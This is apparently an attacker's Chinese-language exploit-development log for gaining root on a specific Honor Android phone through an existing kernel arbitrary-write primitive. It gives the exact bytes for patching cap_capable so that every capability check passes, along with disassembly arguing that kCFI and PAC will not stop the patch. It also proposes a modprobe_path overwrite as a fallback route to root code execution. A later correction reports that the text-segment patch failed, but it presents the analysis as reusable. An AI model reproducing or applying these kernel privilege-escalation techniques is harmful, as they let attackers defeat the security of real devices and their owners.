# H35 阶段二·机理判决：NOP `cap_capable` 提权链

日期：2026-10-05 · 设备：MEY-AN00 / MagicOS 10.0.0.175 / 内核 `6.6.118-android15-8`
状态：**纯分析轮，未开火。** 设备 boot `c87fd633`，uptime 811s，无残留进程。

---

## 0 一句话结论

L1 已实证的「kernel image 任意写」**可以直接撬开全机能力检查**：
把 `cap_capable` 入口 8 字节改写为 `mov w0,#0 ; ret`，
`capable()` 即在**全内核范围**返回 true，`setresuid(0,0,0)` 立刻成功。
**此路完全绕开 H34 判死的「KI 域内找不到自己 cred」死结，且不依赖 oops / 不依赖 init_task / 不依赖关 SELinux。**

---

## 1 完整调用链（全部源码 + 真实机器码双向查实）

```
用户态 setresuid(0,0,0)
  └─ SYSCALL_DEFINE3(setresuid)            kernel/sys.c:755
     └─ __sys_setresuid()                  kernel/sys.c:678
        └─ if ((ruid_new||euid_new||suid_new) && !ns_capable_setid(old->user_ns, CAP_SETUID))
                                          kernel/sys.c:715-717   ← 唯一权限门
           └─ ns_capable_setid()  →  security_capable()       security/security.c:941
              └─ call_int_hook(capable, 0, ...)   [kCFI 校验后 blr x8]
                 └─ cap_capable()   security/commoncap.c:66   ★改写目标
                    return cap_raised(cred->cap_effective, cap) ? 0 : -EPERM;
```

改写后：`cap_capable` 恒返回 0 ⇒ `capable()` 全局 true ⇒ 权限门放行 ⇒ `commit_creds()` 提交 uid=0。

---

## 2 ★ 决定性证据一：`cap_capable` 真实机器码（capstone 反汇编 `Image-mey`）

`cap_capable` vaddr = `0xffffffc08008dd70`（kernel image text 段，H31 已实证可写）
文件映射：**`file_off = vaddr − 0xffffffc080000000`**（已用 3 组符号交叉验证）

```
0xffffffc08008dd70:  ldr   x8, [x0, #0x90]     ; cred->user_ns        (0x90)
0xffffffc08008dd74:  cmp   x8, x1
0xffffffc08008dd78:  b.ne  #0x8dd90
0xffffffc08008dd7c:  ldr   x8, [x0, #0x40]     ; cred->cap_effective  (0x40)
0xffffffc08008dd80:  lsr   x8, x8, x2          ; cap >> bit
0xffffffc08008dd84:  tst   x8, #1
0xffffffc08008dd88:  csetm w0, eq              ; 有cap => w0=0 ; 无cap => w0=-1
0xffffffc08008dd8c:  ret
```

**与 `security/commoncap.c:66` 的源码逐字对应**，确认该函数身份无误。
注意成功路径返回 **0**、`-EPERM` 路径 `mov w0,#-1` ⇒ 改写为「恒 0」即等价于「恒授权」。

---

## 3 ★★ 决定性证据二：kCFI **不阻断**（哈希在入口前 4 字节，不在我改写的位置）

`security_capable`（`0xffffffc080100ac4`）真实机器码：

```
0xffffffc080100b10:  ldur  w16, [x8, #-4]        ; ← 读 [函数入口 − 4] 的类型哈希
0xffffffc080100b14:  movk  w17, #0x9518
0xffffffc080100b18:  movk  w17, #0x90dc, lsl #16 ; w17 = 0x90dc9518
0xffffffc080100b1c:  cmp   w16, w17
0xffffffc080100b20:  b.eq  #0xffffffc080100b28
0xffffffc080100b24:  brk   #0x8228               ; 类型不匹配 → 直接 trap
0xffffffc080100b28:  blr   x8                     ; 校验通过才间接调用
0xffffffc080100b2c:  cbz   w0, #0xffffffc080100af4 ; 返回0 → 继续下一个 hook
```

**哈希交叉验证（决定性）**：

| 项 | 值 |
|---|---|
| `cap_capable` 入口 `−4` 处实际哈希字 | `0x90dc9518` |
| `security_capable` 期望值 `w17` | `0x90dc9518` |
| 比对 | **MATCH** |

⇒ 三重结论：
1. **确证** `cap_capable` 正是 `security_capable` 经 kCFI 校验后调用的那个 hook；
2. kCFI 哈希存放在**被调函数入口前 4 字节**（`[x8-4]`），**不在**我要覆盖的 `[x8+0]`；
3. 改写 `[入口+0 .. +7]` **完全不影响哈希字段** ⇒ **kCFI 校验照样通过，不会触发 `brk #0x8228`**。

这与 A 线「`CFI_PERMISSIVE` 未设 = 严格 CFI」的判定**不矛盾**：严格 CFI 拦的是
「类型不匹配的间接调用」，而本次改写不改变被调函数的类型标识，属**合法通过的路径**。

---

## 4 补丁方案与字节复核（铁律①：hex 一律 Python 复核）

| 项 | 值 |
|---|---|
| 目标地址 | `0xffffffc08008dd70`（`LINK` + slide，`LINK=0xffffffc080000000`） |
| 对齐 | `addr % 4 == 0` ✔ |
| 原始 16 字节 | `084840f9 1f0101eb c1000054 082040f9` |
| 入口前 4 字节（CFI 哈希，**禁止触碰**） | `1895dc90`（LE 即 `0x90dc9518`） |
| 补丁 | `mov w0, #0` = `0x52800000`；`ret` = `0xD65F03C0` |
| 补丁 8 字节（LE） | **`00008052 c0035fd6`** |
| 覆盖范围 | 入口 `+0` ~ `+7`（2 条指令） |

恢复原值同样只需回写这 8 字节。

---

## 5 现有能力如何接上（无需任何新原语）

| 能力 | 状态 | 证据 |
|---|---|---|
| kernel image 任意写 | ✔ 双 boot 实证 | H31 `KI_WRITE_PASS` |
| 写 8 字节到 text 段 | ✔ 已实证（core_pattern 逐字节校验） | H32 `CP_SET_OK` |
| 写 4 字节整数 | ✔ 已实证（`panic_on_oops` 读回 =0） | H33 `POO_PASS` |
| 写入后读回校验 | ✔ 已有现成代码路径 | `probe_kernel_image_write()` |
| `setresuid(0,0,0)` | shell 当前 `CapEff=0000000000000000` ⇒ 现在必 EPERM，改写后应成功 | 本轮实测 |

⇒ **只需在 `f77.c` 里新增一个 `probe_cap_bypass()`**：读原 8 字节 → 写补丁 → 读回比对 → `setresuid(0,0,0)` → 读 `getuid()` 验证 → 回写原值。

---

## 6 风险点与预案（诚实列出，不掩盖）

| 风险 | 评估 | 预案 |
|---|---|---|
| 写 text 段触发 W^X / KRO | 缓解表未启用 W^X（阶段零已判定），H31/H32/H33 已实证可写 text/data | 已有实证背书 |
| kCFI trap | **已排除**（哈希在 −4，位置不冲突，且哈希值 MATCH） | — |
| PAC 签名 | `cap_capable` **无** `paciasp`（已反汇编确认），无签名可验 | — |
| 改写期间并发调用 `capable()` | 窗口仅 8 字节写，且语义从"拒绝"变"放行"，**不会产生错误分支**，最坏是多放行一次 | 单变量对照：只改这 8 字节 |
| kernel image 被 IMA/verified 校验 | 阶段零未列出该缓解；H31–H33 写 data 段成功，text 段**尚无先例** | **这是本方案唯一真正未验证项** ⇒ 见 §7 |
| 回写恢复 | 8 字节原值已知（`084840f9 1f0101eb`） | 无论如何先回写再验证 |

---

## 7 与「改 init 凭据」「core_pattern」「A 线驱动」的对比

| 方案 | 依赖 | 现状 | 评价 |
|---|---|---|---|
| **NOP `cap_capable`（本方案）** | 仅 kernel image 写 | **机理 100% 查实，唯一未验证项＝写 text 段** | **最优** |
| 改 `init_task.cred` | 借 init 通道执行 | init 已有 root，自身已是最可信进程，但**无法让它替我们执行任意命令**（无 `argv` 控制手段） | 次选，机理较弱 |
| `core_pattern` | oops + SELinux 放行 | 被 `shell_data_file` 上下文卡死（H34 §10.7） | 天花板低 |
| 改 `selinux_state` | 运行时关 SELinux | **已源码级判死**（随机布局 / 非 DEVELOP 无 enforcing / 上游已移除 disable） | 不可行 |
| A 线厂商驱动 | 需找到新漏洞 | 502 个 .ko 已全审无一击提权 | 周期长 |

**额外发现（备用路线，非首选）**：`fs/exec.c:1770` 存在 `request_module("binfmt-%04x", ...)`，
且 `CONFIG_MODULES=y`（796 个模块在线，`__request_module`/`call_usermodehelper` 符号齐全），
`modprobe_path` = `0xffffffc08220cb48` 可写 ⇒ 理论上「改 modprobe_path + 执行未知 magic 文件」
可在 **root umh 上下文**跑脚本，不经 shell 的 SELinux 域。作为 NOP 方案失败时的备胎。

---

## 8 判决

**机理链完整闭合，字节级证据齐备，无推测环节。**
唯一未在实机验证的前提是「kernel image **text 段**可写」——
H31/H32/H33 只实证过 data 段（`selinux_state`/`core_pattern`/`panic_on_oops` 均在 `.data`）。
text 段在同一 kernel image 映射内、写原语同一条，**风险很低但必须先验证**。

⇒ 建议 **H36 = 单变量验证 text 段可写性**：只写 `cap_capable` 这 8 字节、立即读回校验、
立即回写原值、进程不退出。验证通过后 H37 再接 `setresuid`。

---

# ⚠️ 实测更正（2026-10-05 H36/H37 之后追加）

> **本判决书的机理分析全部成立，但它的第 6 段「唯一未验证项」判断错了。**
> 实测结果：**kernel image 代码段根本读不了** ⇒ **本方案当轮判死。**

## 实测数据

| 轮 | 结果 |
|---|---|
| H36 r2 (`b263958e9`) | `KI_WRITE_PASS` + `CP_SET_OK` + `CAP_PRE target=0xffffffe06be8dd70` → 截断 |
| H36b r7 (`bf093fd7f`) | `KI_WRITE_PASS` + `CP_SET_OK` + `CAP_PRE target=0xffffffd0f508dd70` → 截断，REBOOT |
| H36b r9 / r10 | 同样精确停在 `CAP_PRE`（3/10 可复现，非随机噪声）|
| **H37 r1（只读探针，决定性）** | `DATARO_ORIG 16843009` ✔ → 读代码区 → **截断，无 TEXTRO_ORIG** |

## H37 的单变量对照（同轮、同探针 `bridge_read_once`、同 8 字节宽度）

| 读目标 | 镜像内偏移 | 区域 | 结果 |
|---|---|---|---|
| `selinux_state` | `0x02bba418` | 数据区 | ✔ 读到 `16843009`（已知值，探针可用）|
| `cap_capable` | `0x0088dd70` | **代码区** | ✘ **同轮读它进程就没了** |

⇒ **唯一变量是目标所在区域** ⇒ 归因确定。

## 两处被证伪的假设

1. **「8 字节读是未验证宽度」** —— 被 `f77.c:4564-4572` 自己的代码证伪：
   `kernel_read_u32()` 内部本来就是 `unsigned char buffer[8]; kernel_read_virtual(..., 8)`，
   H31/H33 的「4 字节读」实际一直是 8 字节读，8B 早已实证。
   （H36b 已把宽度拆成 2×4B，仍死在同一处。）
2. **「kernel image 任意写可覆盖 text 段」** —— 写入从未被测，因为**读就过不去**。

## 真正的盲区

**H31–H33 全部目标都在 kernel image 数据段**（`selinux_state` / `core_pattern` / `panic_on_oops`），
所以「kernel image 侧任意写成立」这一定性结论的**适用域是数据段**，
历史上从未有人把它外推到代码段。H35 判决直接套用而未验证，就是这个盲区导致的。

## 本判决书的价值

机理链本身（`setresuid` → `ns_capable_setid` → `security_capable` → `cap_capable`、
kCFI 哈希在入口 −4 故改 +0..+7 不触发 CFI、`cap_capable` 无 PAC）经源码与真实机器码
双向查实，**结论正确且仍有效**。若将来获得代码段读写能力（例如换一条可写 text 的原语，
或找到 text 段可读的桥），本方案可**直接复用，无需重新分析**。
